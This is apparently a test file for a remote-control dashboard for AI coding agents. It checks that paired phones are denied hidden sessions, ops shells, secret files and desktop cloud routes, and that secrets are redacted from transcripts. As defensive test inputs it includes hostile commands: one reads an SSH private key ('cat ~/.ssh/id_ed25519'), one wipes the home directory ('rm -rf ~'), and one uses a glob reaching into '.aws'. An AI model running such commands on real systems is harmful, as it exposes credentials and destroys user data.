    expect((await call('POST', '/sessions/share-all', PHONE)).status).toBe(404);
    expect(store.getSession('ph-share-all')?.remoteVisible).not.toBe(true);
    const res = await call('POST', '/sessions/share-all', {});
    expect(res.status).toBe(200);
    expect(res.json.shared).toBeGreaterThan(0);
    expect(store.getSession('ph-share-all')?.remoteVisible).toBe(true);
    expect(store.getSession('ph-hidden')?.remoteVisible).toBe(true);
    for (const id of wereHidden) store.setSessionRemoteVisible(id, false);
  });

  it('keeps a restored session shared when the Mac asks, and never takes the flag from a phone', async () => {
    const res = await call('POST', '/terminals', {}, { workingDir: other, command: 'claude', forceNew: true, remoteVisible: true });
    expect(res.status).toBe(200);
    expect(store.getSession(String(res.json.terminalId))?.remoteVisible).toBe(true);
    // A session saved hidden on purpose comes back hidden (the Mac sends false).
    const hidden = await call('POST', '/terminals', {}, { workingDir: other, command: 'claude', forceNew: true, remoteVisible: false });
    expect(hidden.status).toBe(200);
    expect(store.getSession(String(hidden.json.terminalId))?.remoteVisible).toBe(false);
    const phone = await call('POST', '/terminals', PHONE, { workingDir: launchDir, command: 'claude', forceNew: true, remoteVisible: true });
    expect(phone.status).toBe(403);
    expect(String(phone.json.error)).toContain('remoteVisible');
  });

  it('is never handed a hidden session as the one already running there', async () => {
    const res = await call('POST', '/terminals', PHONE, { workingDir: other, command: 'claude' });
    expect(res.status).toBe(200);
    expect(res.json.deduplicated).toBeUndefined();
    expect(res.json.terminalId).not.toBe('ph-hidden');
  });

  it('types only while the agent is the terminal’s foreground program', async () => {
    const presence = await import('../server/presenceManager.js');
    presence.releaseAllControls('ipad-ws');
    pty.fg.set('t-shared', 'zsh'); // the agent exited: this is the login shell underneath
    const shell = await call('POST', '/terminals/t-shared/write', PHONE, { data: 'cat ~/.ssh/id_ed25519\r' });
    expect(shell.status).toBe(409);
    expect(shell.json.code).toBe('AGENT_NOT_RUNNING');
    pty.fg.delete('t-shared'); // unknown counts as not running
    expect((await call('POST', '/terminals/t-shared/write', PHONE, { data: 'x' })).status).toBe(409);
    expect(pty.write).not.toHaveBeenCalled();
    pty.fg.set('t-shared', 'claude');
    expect((await call('POST', '/terminals/t-shared/write', PHONE, { data: 'hi' })).status).toBe(200);
    expect(pty.write).toHaveBeenCalledWith('t-shared', 'hi');
  });

  it('reads the autocomplete catalog only for a shared project', async () => {
    expect((await call('GET', `/commands?${q({ cli: 'claude', projectPath: join(home, 'code', 'library') })}`, PHONE)).status).toBe(404);
    expect((await call('GET', `/commands?${q({ cli: 'claude', projectPath: project })}`, PHONE)).json.code).not.toBe('PHONE_NOT_ALLOWED');
  });

  it('can’t widen a search with a glob', async () => {
    const res = await call('GET', `/files/grep?${q({ root: project, q: 'KEY', glob: '.aws/**' })}`, PHONE);
    expect(res.status).toBe(404);
  });

  it('sees the forks it asks for', async () => {
    const res = await call('POST', '/sessions/ph-shared/fork', PHONE, {});
    expect(res.status).toBe(200);
    expect(store.getSession(String(res.json.terminalId))?.remoteVisible).toBe(true);
  });

  it('starts an AI popup from a shared session, shared with it (AASC-20)', async () => {
    const res = await call('POST', '/sessions/spawn-floating', PHONE, {
      originSessionId: 'ph-shared', spawnTerminalId: 't-shared', mode: 'explain-native',
      selection: 'what does this do', nativeLanguage: 'English', learningLanguage: 'English',
    });
    expect(res.status).toBe(200);
    const id = String(res.json.terminalId);
    expect(pty.created).toHaveLength(1);
    expect(pty.created[0].command).toBe('');
    expect(store.getSession(id)?.remoteVisible).toBe(true);
    expect(store.getSession(id)?.isFloating).toBe(true);
  });

  it('never starts an AI popup from a hidden session or a hidden session’s terminal', async () => {
    for (const body of [
      { originSessionId: 'ph-hidden' },
      { originSessionId: 'no-such-session' },
      { originSessionId: 'ph-shared', spawnTerminalId: 't-hidden' },
    ]) {
      const res = await call('POST', '/sessions/spawn-floating', PHONE, {
        ...body, mode: 'explain-native', selection: 'x', nativeLanguage: 'English', learningLanguage: 'English',
      });
      expect(res.status, JSON.stringify(body)).toBe(404);
    }
    expect(pty.created).toEqual([]);
  });

  // AASC-57: every mode, from a shared session only; a file popup names only a file the phone may read.
  it('starts every AI popup mode from a shared session (AASC-57)', async () => {
    const lang = { nativeLanguage: 'English', learningLanguage: 'English' };
    for (const body of [
      { mode: 'vocab-native', selection: 'baton' },
      { mode: 'translate-selection-learning', selection: 'baton' },
      { mode: 'custom', selection: 'baton', customPrompt: 'Is this safe?' },
      { mode: 'translate-file', fileContent: '# proj', filePath: join(project, 'README.md') },
      { mode: 'explain-native', selection: 'proj', filePath: join(project, 'README.md') },
    ]) {
      pty.created.length = 0;
      const res = await call('POST', '/sessions/spawn-floating', PHONE_B, { originSessionId: 'ph-shared', ...body, ...lang });
      expect(res.status, body.mode).toBe(200);
      expect(pty.created, body.mode).toHaveLength(1);
      expect(store.getSession(String(res.json.terminalId))?.remoteVisible, body.mode).toBe(true);
    }
  });

  it('never starts any AI popup mode from a hidden session, nor one naming a file the phone can’t read', async () => {
    const lang = { nativeLanguage: 'English', learningLanguage: 'English' };
    for (const body of [
      { originSessionId: 'ph-hidden', mode: 'translate-file', fileContent: 'x', filePath: join(other, 'x.md') },
      { originSessionId: 'ph-hidden', mode: 'translate-answer' },
      { originSessionId: 'ph-hidden', mode: 'custom', selection: 'x', customPrompt: 'y' },
      { originSessionId: 'ph-shared', spawnTerminalId: 't-hidden', mode: 'translate-answer' },
      { originSessionId: 'ph-shared', mode: 'translate-file', fileContent: 'KEY', filePath: join(home, '.ssh', 'id_ed25519') },
      { originSessionId: 'ph-shared', mode: 'translate-file', fileContent: 'KEY', filePath: join(project, '.env') },
      { originSessionId: 'ph-shared', mode: 'explain-native', selection: 'x', filePath: join(outside, 'x.md') },
      { originSessionId: 'ph-shared', mode: 'translate-file', fileContent: 'x', filePath: join(home, '.codex', 'auth.json') },
    ]) {
      const res = await call('POST', '/sessions/spawn-floating', PHONE_B, { ...body, ...lang });
      expect(res.status, JSON.stringify(body)).toBe(404);
    }
    expect(pty.created).toEqual([]);
  });

  it('reaches and closes the popups it may see, never a popup made on the Mac and not shared (AASC-57)', async () => {
    const lang = { nativeLanguage: 'English', learningLanguage: 'English' };
    const mine = await call('POST', '/sessions/spawn-floating', PHONE_B, { originSessionId: 'ph-shared', mode: 'explain-native', selection: 'x', ...lang });
    const macs = await call('POST', '/sessions/spawn-floating', {}, { originSessionId: 'ph-shared', mode: 'explain-native', selection: 'x', ...lang });
    const mineId = String(mine.json.terminalId);
    const macsId = String(macs.json.terminalId);
    expect(store.getSession(macsId)?.remoteVisible).not.toBe(true);
    // Its answer (the 6 s capture), the transcript read aloud, and End.
    expect((await call('GET', `/terminals/${macsId}/output`, PHONE)).status).toBe(404);
    expect((await call('GET', `/sessions/${macsId}/transcript`, PHONE)).status).toBe(404);
    expect((await call('DELETE', `/terminals/${macsId}`, PHONE)).status).toBe(404);
    expect((await call('DELETE', `/terminals/${mineId}`, PHONE)).status).toBe(200);
    // Asking from the Mac's hidden popup's terminal is refused like a hidden session.
    expect((await call('POST', '/sessions/spawn-floating', PHONE_B, { originSessionId: 'ph-shared', spawnTerminalId: macsId, mode: 'explain-native', selection: 'x', ...lang })).status).toBe(404);
  });

  it('still can’t reach the other fixed /sessions routes', async () => {
    expect((await call('POST', '/sessions/clear-all', PHONE, {})).status).toBe(404);
    expect((await call('GET', '/sessions/history', PHONE)).status).toBe(404);
    expect((await call('GET', `/sessions/resume-command?${q({ path: project })}`, PHONE)).status).toBe(404);
    expect(store.getSession('ph-shared')).toBeDefined();
  });

  it('reads the Mac’s rooms and asks for changes, but never sets the list (AASC-20)', async () => {
    // The Mac (local, no device connected yet so any local caller is the writer) pushes its list.
    const rooms = [
      { id: 'r-mixed', name: 'Mixed', sessionIds: ['ph-shared', 'ph-hidden'], collapsed: false, createdAt: 1, roomIndex: 0 },
      { id: 'r-secret', name: 'Secret', sessionIds: ['ph-hidden'], collapsed: false, createdAt: 1, roomIndex: 1 },
    ];
    expect((await call('PUT', '/rooms', {}, { rooms })).status).toBe(200);

    const read = await call('GET', '/rooms', PHONE);
    expect(read.status).toBe(200);
    expect(read.json.rooms).toEqual([{ ...rooms[0], sessionIds: ['ph-shared'] }]);

    const set = await call('PUT', '/rooms', PHONE, { rooms: [] });
    expect(set.status).toBe(404);
    expect(set.json.code).toBe('PHONE_NOT_ALLOWED');

    // Through the profile to the rooms router, whose own visibility checks still run.
    const hidden = await call('POST', '/rooms/ops', PHONE, { type: 'move', sessionId: 'ph-hidden', roomId: null });
    expect(hidden.status).toBe(404);
    expect(hidden.json.code).toBeUndefined();
    // No Mac window is connected to apply a change.
    const noWriter = await call('POST', '/rooms/ops', PHONE, { type: 'move', sessionId: 'ph-shared', roomId: null });
    expect(noWriter.status).toBe(409);
    expect(noWriter.json.error).toBe('no-writer');
  });

  it('has an upload budget per minute', async () => {
    const codes: number[] = [];
    for (let i = 0; i <= PHONE_UPLOADS_PER_MINUTE; i++) {
      codes.push((await call('POST', '/queue-images', PHONE, { images: [] })).status);
    }
    expect(codes.slice(0, PHONE_UPLOADS_PER_MINUTE).every((c) => c === 200)).toBe(true);
    expect(codes[PHONE_UPLOADS_PER_MINUTE]).toBe(429);
  });

  it('can’t type into or watch an ops shell, but drives the agent terminal', async () => {
    pty.fg.set('t-shared', 'claude');
    pty.fg.set('ops-shared', 'zsh');
    expect((await call('POST', '/terminals/ops-shared/write', PHONE, { data: 'cat ~/.ssh/id_ed25519\r' })).status).toBe(404);
    expect((await call('GET', '/terminals/ops-shared/output', PHONE)).status).toBe(404);
    expect(pty.write).not.toHaveBeenCalled();
    const res = await call('POST', '/terminals/t-shared/write', PHONE, { data: 'hi' });
    expect(res.status).toBe(200);
    expect(pty.write).toHaveBeenCalledWith('t-shared', 'hi');
  });
});

describe('a password sign-in keeps the dashboard’s full power', () => {
  it('passes the profile untouched', async () => {
    const res = await call('POST', '/terminals', IPAD, { workingDir: other, command: 'bash', forceNew: true });
    expect(res.status).toBe(200);
    expect(pty.created).toEqual([{ command: 'bash', workingDir: other }]);
    expect((await call('GET', `/files/read?${q({ root: project, path: 'keys/id_ed25519' })}`, IPAD)).status).toBe(200);
  });

  it('gets an id for each uploaded image, which a prompt sent through the Mac names it by (AASC-42)', async () => {
    const res = await call('POST', '/queue-images', IPAD, { images: [{ name: 'a.png', dataUrl: 'data:image/png;base64,iVBORw0KGgo=' }] });
    const paths = res.json.paths as string[];
    try {
      expect(paths).toHaveLength(1);
      expect(res.json.ids).toEqual(paths.map((p) => basename(p)));
      expect((res.json.ids as string[]).every(isQueueImageId)).toBe(true);
      expect(paths[0]).toContain('aasc-phone-queue-images-');
    } finally {
      for (const p of paths) rmSync(p, { force: true });
    }
  });
});

// ── The live connection ──────────────────────────────────────────────────────────────────────────────────

class FakeSocket extends EventEmitter {
  readyState = 1;
  bufferedAmount = 0;
  sent: Array<Record<string, unknown>> = [];
  send = vi.fn((raw: string) => { this.sent.push(JSON.parse(raw) as Record<string, unknown>); });
  ping = vi.fn();
  terminate = vi.fn();
  close = vi.fn();
  say(msg: Record<string, unknown>): void { this.emit('message', Buffer.from(JSON.stringify(msg))); }
}

describe('isAgentProcessName', () => {
  it('knows the agents and treats shells and unknowns as not running', () => {
    expect(['claude', 'codex', 'node', 'Claude'].every(isAgentProcessName)).toBe(true);
    expect(['zsh', 'bash', 'sh', 'vim', 'ssh', 'tmux', '', null, undefined].some(isAgentProcessName)).toBe(false);
  });

  // Claude Code's native installer runs ~/.local/share/claude/versions/<version>, so the kernel (and node-pty's
  // pty.process) names the process "2.1.301", not "claude" — seen on a real Mac, Oct 2026.
  it('knows a natively installed Claude by its version-named binary, and only that binary', () => {
    const home = mkdtempSync(join(tmpdir(), 'aasc-native-claude-'));
    try {
      mkdirSync(join(home, '.local', 'share', 'claude', 'versions'), { recursive: true });
      writeFileSync(join(home, '.local', 'share', 'claude', 'versions', '2.1.301'), '');
      vi.stubEnv('HOME', home);
      expect(isAgentProcessName('2.1.301')).toBe(true);
      // A version-shaped name with no such Claude binary is not an agent; nor is anything shell-like.
      expect(isAgentProcessName('2.1.999')).toBe(false);
      expect(isAgentProcessName('1.0')).toBe(false);
      expect(isAgentProcessName('../2.1.301')).toBe(false);
    } finally {
      vi.unstubAllEnvs();
      rmSync(home, { recursive: true, force: true });
    }
  });
});

describe('ops shells on the live connection', () => {
  it('a phone can’t subscribe or type to an ops shell; a password sign-in still can', async () => {
    const ws = await import('../server/wsManager.js');
    const presence = await import('../server/presenceManager.js');
    presence.releaseAllControls('phone-a'); // the HTTP tests above left the phone holding the baton
    const phone = new FakeSocket();
    ws.handleConnection(phone as never, { clientId: 'phone-ws', label: 'Phone', address: '192.168.1.60', isLocal: false, lineage: 'lp', deviceId: 'dev-phone-a' });
    phone.say({ type: 'terminal_subscribe', terminalId: 'ops-shared' });
    phone.say({ type: 'terminal_input', terminalId: 'ops-shared', data: 'id\r' });
    expect(pty.write).not.toHaveBeenCalled();

    const ipad = new FakeSocket();
    ws.handleConnection(ipad as never, { clientId: 'ipad-ws', label: 'iPad', address: '192.168.1.61', isLocal: false, lineage: 'li' });
    ipad.say({ type: 'terminal_subscribe', terminalId: 'ops-shared' });
    ipad.say({ type: 'terminal_input', terminalId: 'ops-shared', data: 'id\r' });
    expect(pty.write).toHaveBeenCalledWith('ops-shared', 'id\r');
    phone.emit('close');
    ipad.emit('close');
  });

  it('a phone types into the agent terminal only while the agent runs, and is told why not', async () => {
    const ws = await import('../server/wsManager.js');
    const presence = await import('../server/presenceManager.js');
    presence.releaseAllControls('ipad-ws');
    presence.releaseAllControls('phone-a');
    const phone = new FakeSocket();
    ws.handleConnection(phone as never, { clientId: 'phone-ws2', label: 'Phone', address: '192.168.1.60', isLocal: false, lineage: 'lp2', deviceId: 'dev-phone-a' });
    phone.say({ type: 'terminal_subscribe', terminalId: 't-shared' });
    pty.fg.set('t-shared', 'zsh');
    phone.say({ type: 'terminal_input', terminalId: 't-shared', data: 'rm -rf ~\r' });
    expect(pty.write).not.toHaveBeenCalled();
    expect(phone.sent.some((m) => m.type === 'terminal_error' && /only while the agent is running/.test(String(m.error)))).toBe(true);
    pty.fg.set('t-shared', 'claude');
    phone.say({ type: 'terminal_input', terminalId: 't-shared', data: 'hello' });
    expect(pty.write).toHaveBeenCalledWith('t-shared', 'hello');
    phone.emit('close');
  });
});

// ── The chat and its edits on a phone (AASC-41 / AASC-44) ────────────────────────────────────────────
// Mounted as server/index.ts mounts them: the phone profile, then the chat router, which redacts for the
// phone the profile marked. HOME points at a temp dir for the transcript (the locator reads only there).
describe('what a phone sees of a secret file in the chat and the edits', () => {
  let chatServer: Server;
  let chatBase = '';
  let chatHome = '';
  let transcript = '';
  const savedHome = process.env.HOME;

  beforeAll(async () => {
    const auth = await import('../server/authManager.js');
    const { createChatRouter } = await import('../server/chat/chatRouter.js');
    const { resetTranscriptLocatorCache } = await import('../server/chat/transcriptLocator.js');
    const { createSubagentTranscriptRouter } = await import('../server/subagentTranscript.js');
    chatHome = realpathSync(mkdtempSync(join(tmpdir(), 'aasc-phone-chat-')));
    process.env.HOME = chatHome;
    resetTranscriptLocatorCache();
    const dir = join(chatHome, '.claude', 'projects', '-proj');
    mkdirSync(dir, { recursive: true });
    transcript = join(dir, 'chat-shared.jsonl');
    const line = (r: unknown) => `${JSON.stringify(r)}\n`;
    writeFileSync(transcript, [
      line({ type: 'assistant', timestamp: '2026-10-16T10:00:00.000Z', message: { role: 'assistant', content: [{ type: 'tool_use', id: 't1', name: 'Read', input: { file_path: '/proj/.env' } }] } }),
      line({ type: 'assistant', timestamp: '2026-10-16T10:00:01.000Z', message: { role: 'assistant', content: [{ type: 'tool_use', id: 'w1', name: 'Write', input: { file_path: '/proj/.env', content: 'API_KEY=sk-123\n' } }] } }),
      line({ type: 'user', timestamp: '2026-10-16T10:00:02.000Z', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'w1', content: 'ok' }] } }),
    ].join(''));
    // A subagent of the session that read the same secret file (AGENTS tab).
    mkdirSync(join(dir, 'chat-shared', 'subagents'), { recursive: true });
    writeFileSync(join(dir, 'chat-shared', 'subagents', 'agent-a1.jsonl'), [
      line({ type: 'user', timestamp: '2026-10-16T10:00:00.000Z', message: { role: 'user', content: 'Check the env file' } }),
      line({ type: 'assistant', timestamp: '2026-10-16T10:00:01.000Z', message: { role: 'assistant', content: [{ type: 'tool_use', id: 's1', name: 'Read', input: { file_path: '/proj/.env' } }] } }),
      line({ type: 'user', timestamp: '2026-10-16T10:00:02.000Z', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 's1', content: 'API_KEY=sk-999' }] } }),
      line({ type: 'assistant', timestamp: '2026-10-16T10:00:03.000Z', message: { role: 'assistant', content: [{ type: 'text', text: 'It holds one key.' }] } }),
    ].join(''));
    const session = {
      sessionId: 'chat-shared', cliSource: 'claude', projectPath: '/proj', transcriptPath: transcript, remoteVisible: true,
      subagents: [{ agentId: 'a1' }],
    };
    const app = express();
    app.use('/api', createPhoneProfile({
      phoneOf: (req) => auth.getTokenDeviceId(auth.extractToken(req)),
      sharedProjectPaths: () => [],
      knownProjectPaths: () => [],
      isOpsTerminal: () => false,
      isSharedSession: () => true,
      sessionOfTerminal: () => null,
      terminalOfSession: () => null,
      foregroundProcess: () => null,
      home: home || tmpdir(),
    }), createChatRouter({ getSession: (id) => (id === 'chat-shared' ? session as never : null), isLocal: () => false }),
    createSubagentTranscriptRouter({ getSession: (id) => (id === 'chat-shared' ? session as never : null) }));
    chatServer = createServer(app);
    await new Promise<void>((r) => chatServer.listen(0, '127.0.0.1', r));
    const addr = chatServer.address();
    if (addr && typeof addr === 'object') chatBase = `http://127.0.0.1:${addr.port}`;
  });

  afterAll(async () => {
    await new Promise<void>((r) => chatServer.close(() => r()));
    if (savedHome === undefined) delete process.env.HOME;
    else process.env.HOME = savedHome;
    rmSync(chatHome, { recursive: true, force: true });
  });

  async function get(path: string, phone: boolean) {
    const auth = await import('../server/authManager.js');
    const headers: Record<string, string> = phone
      ? { 'X-Forwarded-For': '192.168.1.80', Authorization: `Bearer ${auth.createToken('dev-phone-chat')}` }
      : { 'X-Forwarded-For': '192.168.1.81', Authorization: `Bearer ${auth.createToken()}` };
    const res = await fetch(`${chatBase}/api${path}`, { headers });
    return await res.json() as { data: Record<string, unknown> };
  }

  it('hides a secret file’s content from a paired phone, even a result read after its call', async () => {
    const first = await get('/sessions/chat-shared/chat', true);
    expect(JSON.stringify(first)).not.toContain('sk-123');
    // The Read's result lands later, in its own after= read.
    appendFileSync(transcript, `${JSON.stringify({ type: 'user', timestamp: '2026-10-16T10:00:03.000Z', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: 'API_KEY=sk-123' }] } })}\n`);
    const next = await get(`/sessions/chat-shared/chat?after=${encodeURIComponent(first.data.after as string)}`, true);
    const entries = next.data.entries as Array<Record<string, unknown>>;
    expect(entries).toMatchObject([{ kind: 'tool_result', toolUseId: 't1', output: '[Hidden on phones: this touched a secret file]' }]);
    expect(JSON.stringify(next)).not.toContain('sk-123');
  });

  it('shows it to a password sign-in', async () => {
    expect(JSON.stringify(await get('/sessions/chat-shared/chat', false))).toContain('sk-123');
  });

  it('hides what a subagent read from a secret file from a paired phone (AGENTS tab)', async () => {
    const phone = await get('/sessions/chat-shared/subagents/a1/transcript', true);
    expect(JSON.stringify(phone)).not.toContain('sk-999');
    const entries = phone.data.entries as Array<Record<string, unknown>>;
    expect(entries.find((e) => e.role === 'tool_result')).toMatchObject({ output: '[Hidden on phones: this touched a secret file]' });
    expect(entries.find((e) => e.role === 'assistant')).toMatchObject({ text: 'It holds one key.' });
    expect(JSON.stringify(await get('/sessions/chat-shared/subagents/a1/transcript', false))).toContain('sk-999');
  });

  it('marks a secret file in the edits list for a phone, and gives it no hunks', async () => {
    const phone = await get('/sessions/chat-shared/changes', true);
    expect((phone.data.files as Array<Record<string, unknown>>)[0]).toMatchObject({ path: '.env', redacted: true });
    const one = await get('/sessions/chat-shared/changes/0', true);
    expect(one.data).toMatchObject({ hunks: [], redacted: true });
    expect(JSON.stringify(one)).not.toContain('sk-123');
  });
});

// ── AASC Cloud (AASC-51) ─────────────────────────────────────────────────────────────────────────────────

/** Every route the desktop's RESOURCES → Cloud screens call (server/cloud/*Router.ts), relative to /api. */
const DESKTOP_CLOUD_ROUTES: Array<[string, string]> = [
  ['GET', '/resources/cloud/status'], ['POST', '/resources/cloud/connect'], ['POST', '/resources/cloud/recheck'],
  ['POST', '/resources/cloud/disconnect'], ['POST', '/resources/cloud/revoke'],
  ['GET', '/resources/cloud/skill-notes'], ['GET', '/resources/cloud/skill-notes/status'], ['GET', '/resources/cloud/skill-notes/export'],
  ['POST', '/resources/cloud/skill-notes/batch'], ['DELETE', '/resources/cloud/skill-notes/all'],
  ['POST', '/resources/cloud/aliases/device'], ['POST', '/resources/cloud/aliases/status'],
  ['POST', '/resources/cloud/aliases/preview'], ['POST', '/resources/cloud/aliases/reconcile'],
  ['POST', '/resources/cloud/publish-plans'], ['POST', '/resources/cloud/publish-plans/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/run'],
  ['POST', '/resources/cloud/install-plans'], ['POST', '/resources/cloud/install-plans/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/run'],
  ['POST', '/resources/cloud/downloads'], ['GET', '/resources/cloud/downloads/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/file'],
  ['GET', '/resources/cloud/resources'], ['GET', '/resources/cloud/jobs/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c'],
  ['POST', '/resources/cloud/jobs/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/cancel'],
  ['POST', '/resources/cloud/jobs/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/retry'],
  ['POST', '/resources/cloud/installs/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/restore'],
  ['GET', '/resources/cloud/projects'], ['POST', '/resources/cloud/projects'],
  ['GET', '/resources/cloud/projects/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c'],
  ['PUT', '/resources/cloud/projects/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c'],
  ['POST', '/resources/cloud/projects/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/associate'],
  ['POST', '/resources/cloud/projects/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/get'],
  ['POST', '/resources/cloud/projects/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/pull'],
  ['GET', '/resources/cloud/projects/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/local'],
  ['POST', '/resources/cloud/projects/jobs/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/resources-plan'],
  ['POST', '/resources/cloud/projects/jobs/0b6e7a3c-1f2d-4e5a-9b8c-7d6e5f4a3b2c/retry-resources'],
  // Remote access (AASC-60): this Mac's Tailscale state, its refresh, and launching the Tailscale app.
  ['GET', '/resources/cloud/remote-access'], ['POST', '/resources/cloud/remote-access/refresh'],
  ['POST', '/resources/cloud/remote-access/open-tailscale'],
];

describe('AASC Cloud from a paired phone (AASC-51)', () => {
  it('the profile opens only the phone’s own read-only cloud routes, never a desktop one, whatever the method', () => {
    for (const [, path] of DESKTOP_CLOUD_ROUTES) {
      for (const method of ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']) expect(phoneRuleFor(method, path), `${method} ${path}`).toBeNull();
    }
    expect(phoneRuleFor('GET', '/phone-cloud/browse')).toBe('allow');
  });

  it('a phone gets 404 for every desktop cloud route under /api/resources/cloud/*, and its own browse works', async () => {
    const auth = await import('../server/authManager.js');
    const { createResourceRouter, resourceErrorHandler } = await import('../server/resourceRouter.js');
    const { createPhoneCloud, createPhoneCloudRouter } = await import('../server/mobile/phoneCloud.js');
    const cloudCalls: string[] = [];
    const cloud = {
      client: {
        async request(method: string, path: string) {
          cloudCalls.push(`${method} ${path}`);
          return { items: [], nextCursor: null };
        },
      },
      status: () => ({
        state: 'connected',
        lastError: null,
        connection: { backendOrigin: 'https://be.example', accountId: 'acct', deviceId: 'mac', deviceName: 'Mac', generation: 1 },
      }),
      onStop: () => () => {},
    } as unknown as import('../server/cloud/types.js').CloudConnector;
    // Mounted too, so the three remote-access routes are refused by the gate and not by their absence (AASC-60).
    const remoteCalls: string[] = [];
    const remoteAccess = {
      view: async () => { remoteCalls.push('view'); return {} as never; },
      refresh: async () => { remoteCalls.push('refresh'); return {} as never; },
      openTailscale: async () => { remoteCalls.push('openTailscale'); return 'opened' as const; },
    };
    const cloudHome = join(tmp, 'cloud-home');
    mkdirSync(cloudHome, { recursive: true });
    const phoneToken = `Bearer ${auth.createToken('dev-phone-cloud')}`;
    // The production order (server/index.ts): RESOURCES with its local gate first, then /api with the profile.
    const app = express();
    app.use(express.json());
    app.use('/api/resources', createResourceRouter({
      sessionProjectPaths: () => [],
      home: cloudHome,
      cloud,
      remoteAccess,
      cloudAliasDirectory: join(cloudHome, 'cloud'),
      // A phone is never this Mac (requestLocality.ts).
      isLocalRequest: () => false,
    }));
    app.use('/api/resources', resourceErrorHandler);
    app.use('/api', createPhoneProfile({
      phoneOf: (req) => auth.getTokenDeviceId(auth.extractToken(req)),
      sharedProjectPaths: () => [],
      knownProjectPaths: () => [],
      isOpsTerminal: () => false,
      foregroundProcess: () => null,
    }), createPhoneCloudRouter(createPhoneCloud({ cloud })));
    app.use('/api', (_req, res) => res.status(404).json({ error: 'Not found' }));
    const cloudServer = createServer(app);
    await new Promise<void>((r) => cloudServer.listen(0, '127.0.0.1', r));
    const addr = cloudServer.address();
    const cloudBase = `http://127.0.0.1:${addr && typeof addr === 'object' ? addr.port : 0}`;
    try {
      for (const [method, path] of DESKTOP_CLOUD_ROUTES) {
        const res = await fetch(`${cloudBase}/api${path}`, {
          method,
          headers: { Authorization: phoneToken, 'Content-Type': 'application/json' },
          body: method === 'GET' ? undefined : '{}',
        });
        expect(res.status, `${method} ${path}`).toBe(404);
      }
      expect(cloudCalls).toEqual([]);
      expect(remoteCalls).toEqual([]);
      const own = await fetch(`${cloudBase}/api/phone-cloud/browse`, { headers: { Authorization: phoneToken } });
      expect(own.status).toBe(200);
      expect(await own.json()).toMatchObject({ connected: true, state: 'connected', resources: [], projects: [] });
    } finally {
      await new Promise<void>((r) => cloudServer.close(() => r()));
      auth.revokeTokensForDevice('dev-phone-cloud');
    }
  });
});
